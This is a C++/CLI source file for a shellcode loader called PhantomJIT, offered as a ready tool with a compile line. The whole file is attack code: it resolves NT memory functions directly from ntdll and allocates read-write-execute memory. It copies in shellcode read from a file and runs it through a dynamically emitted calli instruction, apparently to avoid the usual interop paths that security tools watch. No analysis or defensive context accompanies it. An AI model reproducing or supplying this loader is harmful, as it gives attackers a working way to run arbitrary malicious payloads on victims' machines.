// Compile with: cl /clr PhantomJit.cpp /link mscoree.lib
#include <windows.h>
#include <string.h>
#using <mscorlib.dll>
#using <System.dll>
using namespace System;
using namespace System::IO;
using namespace System::Reflection;
using namespace System::Reflection::Emit;
using namespace System::Runtime::InteropServices;
//NT
typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
//Func Ptr types (NT)
typedef NTSTATUS (WINAPI *NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);
typedef NTSTATUS (WINAPI *NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);
#define PAGE_EXECUTE_READWRITE 0x40
#define MEM_COMMIT 0x1000
#define MEM_RESERVE 0x2000
int main(array<String^>^ args)
{
    if (args->Length != 1) {
        Console::WriteLine("Usage: {0} <shellcode.bin>", 
            AppDomain::CurrentDomain->FriendlyName);
        return 1;
    }
    array<Byte>^ shellcode;
    try {
        shellcode = File::ReadAllBytes(args[0]);
        Console::WriteLine("[PhantomJIT] Loaded {0} bytes of shellcode", shellcode->Length);
    }
    catch (Exception^ ex) {
        Console::WriteLine("[PhantomJIT] Error reading shellcode: {0}", ex->Message);
        return 1;
    }
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        Console::WriteLine("[PhantomJIT] Failed to get ntdll handle");
        return 1;
    }
    //Simple Nt Func Resolution
    auto NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    auto NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    if (!NtAllocateVirtualMemory || !NtProtectVirtualMemory) {
        Console::WriteLine("[PhantomJIT] Failed to resolve NT functions");
        return 1;
    }
    // Alloc mem with NT
    PVOID baseAddress = NULL;
    SIZE_T regionSize = shellcode->Length;
    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &baseAddress,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!NT_SUCCESS(status)) {
        Console::WriteLine("[PhantomJIT] NtAllocateVirtualMemory failed: 0x{0:X}", status);
        return 1;
    }
    Console::WriteLine("[PhantomJIT] Allocated RWX memory at 0x{0:X}", (ULONG_PTR)baseAddress);
    // Copy shellcode
    pin_ptr<Byte> pShellcode = &shellcode[0];
    memcpy(baseAddress, pShellcode, shellcode->Length);
    // Create dynamic method to execute
    Module^ coreMod = Object::typeid->Module;
    DynamicMethod^ dm = gcnew DynamicMethod(
        "PhantomJIT",
        Void::typeid,
        Type::EmptyTypes,
        coreMod,
        true
    );
    ILGenerator^ il = dm->GetILGenerator();
    // Push the address
    il->Emit(OpCodes::Ldc_I8, (Int64)baseAddress);
    il->Emit(OpCodes::Conv_I);
    // Call it
    il->EmitCalli(
        OpCodes::Calli,
        CallingConvention::StdCall,
        Void::typeid,
        Type::EmptyTypes
    );
    il->Emit(OpCodes::Ret);
    // Execute
    auto action = safe_cast<Action^>(dm->CreateDelegate(Action::typeid));
    Console::WriteLine("[PhantomJIT] Executing shellcode...");
    try {
        action();
        Console::WriteLine("[PhantomJIT] Execution completed successfully");
    }
    catch (Exception^ ex) {
        Console::WriteLine("[PhantomJIT] Execution failed: {0}", ex->Message);
    }
    return 0;
}